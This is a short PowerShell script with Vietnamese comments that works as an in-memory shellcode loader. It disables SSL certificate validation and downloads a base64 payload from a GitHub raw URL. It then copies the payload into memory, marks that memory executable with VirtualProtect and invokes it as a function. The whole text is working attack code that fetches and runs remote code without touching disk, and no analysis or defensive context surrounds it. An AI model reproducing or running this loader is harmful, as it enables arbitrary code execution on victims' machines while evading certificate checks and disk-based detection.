# Bypass SSL và bật TLS 1.2
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

Start-Sleep -Milliseconds 500
# Dùng WebClient thay vì Invoke-WebRequest
$wc = New-Object System.Net.WebClient
$base64_str = $wc.DownloadString("https://raw.githubusercontent.com/0xKaiser/test/0xKaiser-patch-1/loader.b64")

# Decode từ base64
$bytes = [Convert]::FromBase64String($base64_str)

# Cấp phát bộ nhớ
$ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bytes.Length)
[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $ptr, $bytes.Length)

# Đổi quyền bộ nhớ thành thực thi
$oldProtect = 0
$vp = Add-Type -MemberDefinition @"
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(System.IntPtr lpAddress, UInt32 dwSize, UInt32 flNewProtect, ref UInt32 lpflOldProtect);
"@ -Name "Win32" -Namespace "PInvoke" -PassThru
$vp::VirtualProtect($ptr, $bytes.Length, 0x40, [ref]$oldProtect) | Out-Null

# Tạo delegate và gọi shellcode
$DelegateType = Add-Type -Name "Exec" -Namespace "Win32" -MemberDefinition @"
    [UnmanagedFunctionPointer(System.Runtime.InteropServices.CallingConvention.StdCall)]
    public delegate void VoidFunc();
"@ -PassThru
$func = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, [Win32.Exec+VoidFunc])
$func.Invoke()
